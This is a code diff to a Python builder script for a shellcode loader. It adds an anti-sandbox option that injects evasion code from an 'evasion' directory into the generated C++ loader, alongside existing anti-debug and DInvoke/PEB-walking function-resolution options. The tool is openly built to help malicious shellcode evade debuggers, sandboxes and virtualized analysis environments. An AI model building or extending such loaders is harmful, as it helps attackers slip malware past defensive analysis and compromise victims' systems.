@@ -36,6 +36,10 @@ def init_args():
                         dest='debug', 
                         action='store_true')
     
+    parser.add_argument('-as', '--anti-sandbox', help='Enable anti sandboxing/virtualization option', 
+                        dest='sandbox', 
+                        action='store_true')
+    
     parser.add_argument('-m', '--method', 
                         help='''Method to use to dynamically load functions.\nDInvoke: Use LoadLibraryA and GetProcAddress to get function pointers.\nPEBWalk: Grab a handle to the PEB and walk through the LDR table to find the hash for desired functions.''', 
                         choices=['dinvoke', 'pebwalk'],
@@ -158,6 +162,13 @@ if __name__ == '__main__':
             source = source.replace('<ANTI_DEBUG>', antiDebug)
         else:
             source = source.replace('<ANTI_DEBUG>', 'void antiDebug(){}')
+
+        if args.sandbox:
+            with open("src/evasion/antisandbox.cpp", 'r') as f:
+                antiDebug = f.read()
+            source = source.replace('<ANTI_SANDBOX>', antiDebug)
+        else:
+            source = source.replace('<ANTI_SANDBOX>', 'void antiSandbox(){}')
 
         with open('ShellcodeLoaderBuilder/Source.cpp', 'w') as f:
             f.write(source)
